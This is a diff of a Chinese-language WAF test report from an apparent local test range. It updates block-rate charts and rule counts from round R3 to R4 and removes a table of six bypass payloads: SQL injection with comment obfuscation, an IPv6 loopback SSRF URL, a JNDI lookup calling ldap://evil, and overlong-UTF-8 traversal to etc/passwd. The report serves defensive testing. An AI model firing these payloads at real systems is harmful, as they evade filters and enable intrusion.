@@ -40,26 +40,26 @@
 
 <header>
   <h1>BypassLab · WAF 对抗测试报告</h1>
-  <div class="sub">生成时间 2026-10-26 14:06 ｜ 判定口径：HTTP 403 且响应头带 X-BypassLab-Blocked 才计为「拦截」｜ 全部测试仅针对本地靶场</div>
+  <div class="sub">生成时间 2026-10-26 15:02 ｜ 判定口径：HTTP 403 且响应头带 X-BypassLab-Blocked 才计为「拦截」｜ 全部测试仅针对本地靶场</div>
 </header>
 
 <div class="kpis">
   
-  <div class="kpi"><div class="t">攻击拦截率</div><div class="v">94.1%</div><div class="h">96/102 条攻击样本</div></div>
+  <div class="kpi"><div class="t">攻击拦截率</div><div class="v">100.0%</div><div class="h">96/96 条攻击样本</div></div>
   
   <div class="kpi"><div class="t">良性误报率</div><div class="v">0.0%</div><div class="h">0/28 条良性样本</div></div>
   
-  <div class="kpi"><div class="t">样本总量</div><div class="v">130</div><div class="h">本轮语料条数</div></div>
+  <div class="kpi"><div class="t">样本总量</div><div class="v">124</div><div class="h">本轮语料条数</div></div>
   
-  <div class="kpi"><div class="t">剩余绕过</div><div class="v">6</div><div class="h">R4 补规则的输入</div></div>
+  <div class="kpi"><div class="t">剩余绕过</div><div class="v">0</div><div class="h">R4 补规则的输入</div></div>
   
 </div>
 
 <h2>拦截率随对抗轮次变化</h2>
-<div class="card"><svg viewBox="0 0 720 220" role="img" aria-label="拦截率随对抗轮次变化"><line x1="52" y1="26" x2="696" y2="26" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="30" text-anchor="end" font-size="11" fill="#6B7785">100%</text><line x1="52" y1="64" x2="696" y2="64" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="68" text-anchor="end" font-size="11" fill="#6B7785">75%</text><line x1="52" y1="103" x2="696" y2="103" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="107" text-anchor="end" font-size="11" fill="#6B7785">50%</text><line x1="52" y1="141" x2="696" y2="141" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="145" text-anchor="end" font-size="11" fill="#6B7785">25%</text><line x1="52" y1="180" x2="696" y2="180" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="184" text-anchor="end" font-size="11" fill="#6B7785">0%</text><polyline points="52.0,57.2 374.0,26.0 696.0,35.1" fill="none" stroke="#1F4E79" stroke-width="2.5"/><circle cx="52.0" cy="57.2" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="52.0" y="43.2" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">79.8%</text><text x="52.0" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R1 v1.0 基线</text><circle cx="374.0" cy="26.0" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="374.0" y="12.0" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">100.0%</text><text x="374.0" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R2 v1.1 修复</text><circle cx="696.0" cy="35.1" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="696.0" y="21.1" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">94.1%</text><text x="696.0" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R3 换硬语料</text></svg></div>
+<div class="card"><svg viewBox="0 0 720 220" role="img" aria-label="拦截率随对抗轮次变化"><line x1="52" y1="26" x2="696" y2="26" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="30" text-anchor="end" font-size="11" fill="#6B7785">100%</text><line x1="52" y1="64" x2="696" y2="64" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="68" text-anchor="end" font-size="11" fill="#6B7785">75%</text><line x1="52" y1="103" x2="696" y2="103" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="107" text-anchor="end" font-size="11" fill="#6B7785">50%</text><line x1="52" y1="141" x2="696" y2="141" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="145" text-anchor="end" font-size="11" fill="#6B7785">25%</text><line x1="52" y1="180" x2="696" y2="180" stroke="#E3E8EF" stroke-width="1"/><text x="44" y="184" text-anchor="end" font-size="11" fill="#6B7785">0%</text><polyline points="52.0,57.2 266.7,26.0 481.3,26.0 696.0,26.0" fill="none" stroke="#1F4E79" stroke-width="2.5"/><circle cx="52.0" cy="57.2" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="52.0" y="43.2" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">79.8%</text><text x="52.0" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R1 v1.0 基线</text><circle cx="266.7" cy="26.0" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="266.7" y="12.0" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">100.0%</text><text x="266.7" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R2 v1.1 修复</text><circle cx="481.3" cy="26.0" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="481.3" y="12.0" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">100.0%</text><text x="481.3" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R3 v1.2 硬语料</text><circle cx="696.0" cy="26.0" r="5" fill="#fff" stroke="#1F4E79" stroke-width="2.5"/><text x="696.0" y="12.0" text-anchor="middle" font-size="12" font-weight="700" fill="#1F4E79">100.0%</text><text x="696.0" y="206" text-anchor="middle" font-size="11" fill="#6B7785">R4 全新一批</text></svg></div>
 
 <h2>本轮各类别拦截率（短板在前）</h2>
-<div class="card"><svg viewBox="0 0 720 226" role="img" aria-label="各类别拦截率"><text x="0" y="23" font-size="12" fill="#333">sqli</text><rect x="150" y="12" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="12" width="378" height="14" rx="3" fill="#C0392B"/><text x="590" y="23" font-size="12" fill="#333">22/25（88%）</text><text x="0" y="53" font-size="12" fill="#333">path-traversal</text><rect x="150" y="42" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="42" width="390" height="14" rx="3" fill="#D68910"/><text x="590" y="53" font-size="12" fill="#333">10/11（91%）</text><text x="0" y="83" font-size="12" fill="#333">deserialization</text><rect x="150" y="72" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="72" width="396" height="14" rx="3" fill="#D68910"/><text x="590" y="83" font-size="12" fill="#333">12/13（92%）</text><text x="0" y="113" font-size="12" fill="#333">ssrf</text><rect x="150" y="102" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="102" width="396" height="14" rx="3" fill="#D68910"/><text x="590" y="113" font-size="12" fill="#333">12/13（92%）</text><text x="0" y="143" font-size="12" fill="#333">rce</text><rect x="150" y="132" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="132" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="143" font-size="12" fill="#333">14/14（100%）</text><text x="0" y="173" font-size="12" fill="#333">scanner</text><rect x="150" y="162" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="162" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="173" font-size="12" fill="#333">8/8（100%）</text><text x="0" y="203" font-size="12" fill="#333">xss</text><rect x="150" y="192" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="192" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="203" font-size="12" fill="#333">18/18（100%）</text></svg></div>
+<div class="card"><svg viewBox="0 0 720 226" role="img" aria-label="各类别拦截率"><text x="0" y="23" font-size="12" fill="#333">deserialization</text><rect x="150" y="12" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="12" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="23" font-size="12" fill="#333">10/10（100%）</text><text x="0" y="53" font-size="12" fill="#333">path-traversal</text><rect x="150" y="42" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="42" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="53" font-size="12" fill="#333">12/12（100%）</text><text x="0" y="83" font-size="12" fill="#333">rce</text><rect x="150" y="72" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="72" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="83" font-size="12" fill="#333">14/14（100%）</text><text x="0" y="113" font-size="12" fill="#333">scanner</text><rect x="150" y="102" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="102" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="113" font-size="12" fill="#333">8/8（100%）</text><text x="0" y="143" font-size="12" fill="#333">sqli</text><rect x="150" y="132" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="132" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="143" font-size="12" fill="#333">24/24（100%）</text><text x="0" y="173" font-size="12" fill="#333">ssrf</text><rect x="150" y="162" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="162" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="173" font-size="12" fill="#333">10/10（100%）</text><text x="0" y="203" font-size="12" fill="#333">xss</text><rect x="150" y="192" width="430" height="14" rx="3" fill="#F0F3F7"/><rect x="150" y="192" width="430" height="14" rx="3" fill="#1E8E5A"/><text x="590" y="203" font-size="12" fill="#333">18/18（100%）</text></svg></div>
 
 <h2>命中规则分布（本轮 Top 8）</h2>
 <div class="card">
@@ -68,7 +68,7 @@
     
     <tr>
       <td class="mono">BL-SQLI-001</td>
-      <td>11</td>
+      <td>13</td>
       <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
         <div style="width:100%;background:#1F4E79;height:10px;border-radius:3px"></div>
       </div></td>
@@ -76,17 +76,17 @@
     
     <tr>
       <td class="mono">BL-SSRF-001</td>
-      <td>11</td>
+      <td>9</td>
       <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:100%;background:#1F4E79;height:10px;border-radius:3px"></div>
+        <div style="width:69%;background:#1F4E79;height:10px;border-radius:3px"></div>
       </div></td>
     </tr>
     
     <tr>
       <td class="mono">BL-RCE-001</td>
-      <td>9</td>
+      <td>8</td>
       <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:82%;background:#1F4E79;height:10px;border-radius:3px"></div>
+        <div style="width:62%;background:#1F4E79;height:10px;border-radius:3px"></div>
       </div></td>
     </tr>
     
@@ -94,95 +94,48 @@
       <td class="mono">BL-SCAN-001</td>
       <td>8</td>
       <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:73%;background:#1F4E79;height:10px;border-radius:3px"></div>
-      </div></td>
-    </tr>
-    
-    <tr>
-      <td class="mono">BL-XSS-001</td>
-      <td>8</td>
-      <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:73%;background:#1F4E79;height:10px;border-radius:3px"></div>
-      </div></td>
-    </tr>
-    
-    <tr>
-      <td class="mono">BL-DESER-001</td>
-      <td>7</td>
-      <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:64%;background:#1F4E79;height:10px;border-radius:3px"></div>
+        <div style="width:62%;background:#1F4E79;height:10px;border-radius:3px"></div>
       </div></td>
     </tr>
     
     <tr>
       <td class="mono">BL-TRAV-001</td>
-      <td>7</td>
+      <td>8</td>
       <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:64%;background:#1F4E79;height:10px;border-radius:3px"></div>
+        <div style="width:62%;background:#1F4E79;height:10px;border-radius:3px"></div>
       </div></td>
     </tr>
     
     <tr>
       <td class="mono">BL-XSS-002</td>
+      <td>8</td>
+      <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
+        <div style="width:62%;background:#1F4E79;height:10px;border-radius:3px"></div>
+      </div></td>
+    </tr>
+    
+    <tr>
+      <td class="mono">BL-TRAV-002</td>
       <td>7</td>
       <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
-        <div style="width:64%;background:#1F4E79;height:10px;border-radius:3px"></div>
+        <div style="width:54%;background:#1F4E79;height:10px;border-radius:3px"></div>
+      </div></td>
+    </tr>
+    
+    <tr>
+      <td class="mono">BL-XSS-001</td>
+      <td>7</td>
+      <td><div style="background:#EFF3F8;border-radius:3px;height:10px">
+        <div style="width:54%;background:#1F4E79;height:10px;border-radius:3px"></div>
       </div></td>
     </tr>
     
   </table>
 </div>
 
-<h2>剩余绕过清单（6 条，下一轮补规则的输入）</h2>
+<h2>剩余绕过清单（0 条，下一轮补规则的输入）</h2>
 
-<div class="card">
-  <table>
-    <tr><th>样本</th><th>类别</th><th>名称</th><th>载荷（截断）</th></tr>
-    
-    <tr>
-      <td class="mono">W3-HARD-SSRF-003</td>
-      <td>ssrf</td>
-      <td>IPv6 映射回环</td>
-      <td class="mono">url=http%3A%2F%2F%5B%3A%3Affff%3A127.0.0.1%5D%3A8080%2F</td>
-    </tr>
-    
-    <tr>
-      <td class="mono">W3-HARD-SQLI-001</td>
-      <td>sqli</td>
-      <td>MySQL 版本注释</td>
-      <td class="mono">id=1%20/*!50000union*/%20select%201</td>
-    </tr>
-    
-    <tr>
-      <td class="mono">W3-HARD-SQLI-002</td>
-      <td>sqli</td>
-      <td>关键字中间插注释</td>
-      <td class="mono">id=1%20un/**/ion%20se/**/lect%201</td>
-    </tr>
-    
-    <tr>
-      <td class="mono">W3-HARD-SQLI-004</td>
-      <td>sqli</td>
-      <td>括号包裹恒真式</td>
-      <td class="mono">id=1%20and%20(1)=(1)</td>
-    </tr>
-    
-    <tr>
-      <td class="mono">W3-HARD-DESER-002</td>
-      <td>deserialization</td>
-      <td>JNDI env 前缀绕过</td>
-      <td class="mono">${${env:FOO:-j}ndi:ldap://evil/a}</td>
-    </tr>
-    
-    <tr>
-      <td class="mono">W3-HARD-TRAV-001</td>
-      <td>path-traversal</td>
-      <td>超长 UTF-8 斜杠</td>
-      <td class="mono">f=..%c0%af..%c0%afetc%c0%afpasswd</td>
-    </tr>
-    
-  </table>
-</div>
+<div class="card"><span class="tag">本轮无语料内绕过</span> 注意：这只说明当前语料被全部覆盖，不代表泛化能力。</div>
 
 
 <h2>误报清单（0 条）</h2>
@@ -214,12 +167,21 @@
     </tr>
     
     <tr>
-      <td>R3 换硬语料</td>
+      <td>R3 v1.2 硬语料</td>
       <td>130</td>
-      <td>96/102</td>
-      <td><b style="color:#1F4E79">94%</b></td>
+      <td>102/102</td>
+      <td><b style="color:#1F4E79">100%</b></td>
       <td>0%</td>
-      <td><span class="tag bad">6</span></td>
+      <td><span class="tag">0</span></td>
+    </tr>
+    
+    <tr>
+      <td>R4 全新一批</td>
+      <td>124</td>
+      <td>96/96</td>
+      <td><b style="color:#1F4E79">100%</b></td>
+      <td>0%</td>
+      <td><span class="tag">0</span></td>
     </tr>
     
   </table>
